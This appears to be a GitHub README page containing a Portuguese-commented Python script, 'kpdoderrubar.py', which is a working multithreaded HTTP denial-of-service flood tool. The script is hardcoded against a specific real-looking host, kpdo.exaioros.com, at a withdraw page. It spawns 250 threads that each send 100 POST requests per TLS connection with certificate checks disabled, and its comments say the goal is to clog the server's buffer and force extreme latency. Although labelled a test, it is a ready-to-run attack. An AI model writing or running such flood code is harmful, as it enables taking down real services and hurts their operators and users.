# testderrube
derrube testet
[kpdoderrubar.py](https://github.com/user-attachments/files/26728843/kpdoderrubar.py)
import socket
import ssl
import threading
import time
import sys

# Variáveis globais de controle
stats = {'sent': 0, 'success': 0, 'error': 0}
lock = threading.Lock()
running = True

class TurboDerrubar:
    def __init__(self, host, port, path, threads):
        self.host = host
        self.port = port
        self.path = path
        self.threads = threads
        self.start_time = None

    def create_request(self):
        """Gera a requisição POST otimizada"""
        return (f"POST {self.path} HTTP/1.1\r\n"
                f"Host: {self.host}\r\n"
                f"User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)\r\n"
                f"Content-Type: application/x-www-form-urlencoded\r\n"
                f"Content-Length: 9\r\n"
                f"Connection: keep-alive\r\n"
                f"\r\n"
                f"buy_id=27").encode()

    def attack(self):
        """Lógica de ataque com multiplicador para forçar 20.000ms de ping"""
        global stats, running
        while running:
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                # Timeout aumentado para 25s para registrar pings altíssimos
                sock.settimeout(25) 
                
                context = ssl.create_default_context()
                context.check_hostname = False
                context.verify_mode = ssl.CERT_NONE
                
                ssl_sock = context.wrap_socket(sock, server_hostname=self.host)
                ssl_sock.connect((self.host, self.port))
                
                # MULTIPLICADOR: Envia 100 requisições por conexão para entupir o buffer
                for _ in range(100): 
                    if not running: break
                    ssl_sock.sendall(self.create_request())
                    with lock:
                        stats['sent'] += 1
                        stats['success'] += 1
                
                ssl_sock.close()
            except:
                with lock:
                    stats['error'] += 1
                time.sleep(0.01) # Pequena pausa para não travar seu processador

    def monitor(self):
        """Exibe o status em tempo real"""
        last_sent = 0
        while running:
            time.sleep(1)
            with lock:
                curr_sent = stats['sent']
                errors = stats['error']
            
            rps = curr_sent - last_sent
            last_sent = curr_sent
            print(f"\r🚀 STATUS: {curr_sent:,} enviadas | Erros: {errors} | RPS: {rps}/s", end='', flush=True)

    def start(self):
        self.start_time = time.time()
        print(f"\n🔥 MODO OVERLOAD: {self.host} | Threads: {self.threads}")
        
        threading.Thread(target=self.monitor, daemon=True).start()

        # Disparo das threads (Configurado para 250 threads)
        for i in range(self.threads):
            t = threading.Thread(target=self.attack, daemon=True)
            t.start()
            if i % 50 == 0: time.sleep(0.05) # Disparo rápido

        try:
            while True: time.sleep(1)
        except KeyboardInterrupt:
            global running
            running = False
            print("\n\n🛑 Teste interrompido. Finalizando...")

if __name__ == "__main__":
    # Configurações fixas conforme solicitado
    h = "kpdo.exaioros.com"
    p = 443
    # Se quiser testar mais, mude o 250 abaixo para 500
    threads_count = 250 
    
    app = TurboDerrubar(h, p, "/index.php?subtopic=withdraw&action=select_player", threads_count)
    app.start()
